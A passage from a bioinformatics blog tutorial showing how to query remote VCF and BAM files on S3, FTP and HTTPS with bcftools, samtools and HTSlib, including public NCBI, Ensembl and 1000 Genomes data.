<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws configure  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Interactive setup</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="22-querying-s3-hosted-vcf-files">2.2 Querying S3-hosted VCF Files<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#22-querying-s3-hosted-vcf-files" class="hash-link" aria-label="Direct link to 2.2 Querying S3-hosted VCF Files" title="Direct link to 2.2 Querying S3-hosted VCF Files" translate="no">​</a></h3>
<p>Query a specific genomic region from a remote VCF file:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query chromosome 1, positions 1-1000000</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view s3://my-bucket/data/variants.vcf.gz chr1:1-1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Count variants in a region</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-H</span><span class="token plain"> s3://my-bucket/data/variants.vcf.gz chr1:1-1000000 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract samples and subset to region</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> sample1,sample2 s3://my-bucket/data/variants.vcf.gz chr1:1-1000000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">v</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="23-querying-s3-hosted-bam-files">2.3 Querying S3-hosted BAM Files<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#23-querying-s3-hosted-bam-files" class="hash-link" aria-label="Direct link to 2.3 Querying S3-hosted BAM Files" title="Direct link to 2.3 Querying S3-hosted BAM Files" translate="no">​</a></h3>
<p>Extract reads from specific genomic regions:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query region from remote BAM</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools view s3://my-bucket/data/aligned.bam chr1:1-1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Count reads in region</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> s3://my-bucket/data/aligned.bam chr1:1-1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract to local BAM file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> s3://my-bucket/data/aligned.bam chr1:1-1000000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> region.bam</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="24-region-based-subsetting-workflow">2.4 Region-based Subsetting Workflow<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#24-region-based-subsetting-workflow" class="hash-link" aria-label="Direct link to 2.4 Region-based Subsetting Workflow" title="Direct link to 2.4 Region-based Subsetting Workflow" translate="no">​</a></h3>
<p>Efficient workflow for extracting subsets from S3:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. List available S3 files (using AWS CLI)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> s3://my-bucket/data/ </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--recursive</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Query specific region from VCF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  s3://my-bucket/data/chr1.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  chr1:10000000-20000000 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">v</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> local_subset.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Validate and compress</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bgzip </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> local_subset.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tabix </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> vcf local_subset.vcf.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Annotate or further process locally</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools annotate local_subset.vcf.gz </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"> annotation.vcf.gz </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> ID</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="25-working-with-public-genomic-data">2.5 Working with Public Genomic Data<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#25-working-with-public-genomic-data" class="hash-link" aria-label="Direct link to 2.5 Working with Public Genomic Data" title="Direct link to 2.5 Working with Public Genomic Data" translate="no">​</a></h3>
<p>Public genomic repositories are excellent for testing remote file access. While S3 is available, HTTPS endpoints are often more reliable for quick testing.</p>
<p><strong>Query NCBI dbSNP data via HTTPS:</strong></p>
<p>NCBI provides public access to common variants. Test with real data:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query NCBI dbSNP common variants (via HTTPS)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  https://ftp.ncbi.nlm.nih.gov/snp/organisms/human_9606_b150_GRCh37p13/VCF/00-common_all.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> pixi run bcftools query </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'%CHROM\t%POS\t%REF\t%ALT\n'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-20</span><br></span></code></pre></div></div>
<p>Expected output showing real variants:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1	10177	A	AC</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1	10352	T	TA</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1	10352	T	TA</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1	10616	CCGCCGTTGCAAAGGCGCGCCG	C</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1	10642	G	A</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1	11008	C	G</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">1	11012	C	G</span><br></span></code></pre></div></div>
<p><strong>Discover available files:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># List NCBI FTP VCF files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> https://ftp.ncbi.nlm.nih.gov/snp/organisms/human_9606_b150_GRCh37p13/VCF/ </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">".vcf.gz</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\"</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"href=</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\"</span><span class="token string" style="color:hsl(119, 34%, 47%)">[^</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\"</span><span class="token string" style="color:hsl(119, 34%, 47%)">]*</span><span class="token string entity" style="color:hsl(230, 8%, 24%)">\"</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token plain"> -d</span><span class="token string" style="color:hsl(119, 34%, 47%)">'"'</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or for 1000 Genomes in S3:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> s3://1000genomes/phase3/data/ --no-sign-request </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-20</span><br></span></code></pre></div></div>
<p><strong>Region-based queries (with indexed files):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query specific chromosome region</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Note: Requires .tbi index at the remote location</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run bcftools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  https://ftp.ncbi.nlm.nih.gov/snp/organisms/human_9606_b150_GRCh37p13/VCF/00-common_all.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  chr1:1000000-2000000</span><br></span></code></pre></div></div>
<p><strong>Note on S3 vs HTTPS:</strong></p>
<ul>
<li class=""><strong>HTTPS</strong> (like NCBI): Reliable, requires no credentials for public data</li>
<li class=""><strong>S3</strong>: Fastest for large datasets, requires AWS credentials or public bucket setup</li>
<li class=""><strong>FTP</strong>: Alternative for some repositories, generally slower than HTTPS</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-ftp-remote-file-access">3. FTP Remote File Access<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#3-ftp-remote-file-access" class="hash-link" aria-label="Direct link to 3. FTP Remote File Access" title="Direct link to 3. FTP Remote File Access" translate="no">​</a></h2>
<p>FTP servers host many public genomic datasets. HTSlib supports the <code>ftp://</code> protocol.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="31-ftp-authentication">3.1 FTP Authentication<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#31-ftp-authentication" class="hash-link" aria-label="Direct link to 3.1 FTP Authentication" title="Direct link to 3.1 FTP Authentication" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="anonymous-access">Anonymous Access<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#anonymous-access" class="hash-link" aria-label="Direct link to Anonymous Access" title="Direct link to Anonymous Access" translate="no">​</a></h4>
<p>Many public repositories allow anonymous FTP:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># No credentials needed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view ftp://ftp.ncbi.nlm.nih.gov/genomes/H_sapiens/VCF/common_all.vcf.gz chr1:1-1000000</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="authenticated-ftp">Authenticated FTP<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#authenticated-ftp" class="hash-link" aria-label="Direct link to Authenticated FTP" title="Direct link to Authenticated FTP" translate="no">​</a></h4>
<p>For private FTP servers, include credentials in the URL:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view ftp://username:password@ftp.example.com/data/variants.vcf.gz chr1:1-1000000</span><br></span></code></pre></div></div>
<p><strong>Security Note</strong>: URL-embedded credentials are visible in process listings. Prefer environment variables:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">FTP_USER</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"your_username"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">FTP_PASSWORD</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"your_password"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># HTSlib will use these automatically</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view ftp://ftp.example.com/data/variants.vcf.gz chr1:1-1000000</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="32-querying-ftp-hosted-files">3.2 Querying FTP-hosted Files<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#32-querying-ftp-hosted-files" class="hash-link" aria-label="Direct link to 3.2 Querying FTP-hosted Files" title="Direct link to 3.2 Querying FTP-hosted Files" translate="no">​</a></h3>
<p>Common public genomic repositories accessible via FTP:</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="ncbi-ftp-repository">NCBI FTP Repository<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#ncbi-ftp-repository" class="hash-link" aria-label="Direct link to NCBI FTP Repository" title="Direct link to NCBI FTP Repository" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query NCBI's common variants file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ftp://ftp.ncbi.nlm.nih.gov/snp/organisms/human_9606_b150_GRCh37p13/VCF/common_all.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  chr1:1-1000000 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> bcftools query </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'%CHROM\t%POS\t%AC\t%AF\n'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-10</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="ensembl-ftp-repository">Ensembl FTP Repository<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#ensembl-ftp-repository" class="hash-link" aria-label="Direct link to Ensembl FTP Repository" title="Direct link to Ensembl FTP Repository" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Query Ensembl VCF (example path)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  ftp://ftp.ensembl.org/pub/data_files/homo_sapiens/VEP/Homo_sapiens_phenotypes_associated_variants-GRCh38.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain">:1-1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># List available Ensembl files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ftp</span><span class="token plain"> ftp.ensembl.org  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Interactive FTP session</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="33-ftp-performance-tips">3.3 FTP Performance Tips<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#33-ftp-performance-tips" class="hash-link" aria-label="Direct link to 3.3 FTP Performance Tips" title="Direct link to 3.3 FTP Performance Tips" translate="no">​</a></h3>
<ul>
<li class=""><strong>Network stability</strong>: FTP can be slower than HTTPS for single queries. Consider batch processing.</li>
<li class=""><strong>Index availability</strong>: Verify <code>.tbi</code> or <code>.csi</code> indexes are present on the FTP server for efficient region queries.</li>
<li class=""><strong>Timeout handling</strong>: Set timeout environment variables for unreliable connections:</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">CURL_CONNECT_TIMEOUT</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">30</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">CURL_TIMEOUT</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">60</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-https-remote-file-access">4. HTTPS Remote File Access<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#4-https-remote-file-access" class="hash-link" aria-label="Direct link to 4. HTTPS Remote File Access" title="Direct link to 4. HTTPS Remote File Access" translate="no">​</a></h2>
<p>HTTPS endpoints often require token-based authentication and are increasingly common for cloud-hosted data.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="41-https-authentication-methods">4.1 HTTPS Authentication Methods<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#41-https-authentication-methods" class="hash-link" aria-label="Direct link to 4.1 HTTPS Authentication Methods" title="Direct link to 4.1 HTTPS Authentication Methods" translate="no">​</a></h3>
